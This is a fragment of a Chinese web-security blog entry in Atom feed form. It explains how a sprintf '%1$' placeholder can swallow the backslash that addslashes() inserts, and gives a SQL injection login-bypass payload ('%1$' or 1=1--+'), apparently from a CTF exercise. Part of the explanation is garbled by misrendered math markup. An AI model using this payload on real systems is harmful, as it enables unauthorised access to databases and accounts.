&lt;p&gt;如果我们输入 &amp;quot;%&amp;quot; 或者 &amp;quot;%1&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mover accent=&#34;true&#34;&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mo&gt;¨&lt;/mo&gt;&lt;/mover&gt;&lt;mtext&gt;他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么&lt;/mtext&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;&amp;quot;&lt;/mi&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\&amp;quot;,他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么&amp;quot;%\&amp;quot;,&amp;quot;%1&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8889em;vertical-align:-0.1944em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord accent&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.6679em;&#34;&gt;&lt;span style=&#34;top:-3em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;accent-body&#34; style=&#34;left:-0.25em;&#34;&gt;&lt;span class=&#34;mord&#34;&gt;¨&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.1944em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;他会把反斜杠当做格式化字符的类型，然而找不到匹配的项那么&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&amp;quot; 就因为没有经过任何处理而被替换为空。如果 %1$ + 非 arg 格式类型，程序会无法识别占位符类型，变为空&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;做题时遇到了函数 addslashes ()，会在单引号前面加 / 无法用单引号闭合&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?name=1&amp;amp;pass=%1$&amp;#x27; or 1=1--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
</content>
        <category term="web安全" />
        <updated>2023-03-24T16:00:00.000Z</updated>
    </entry>
</feed>
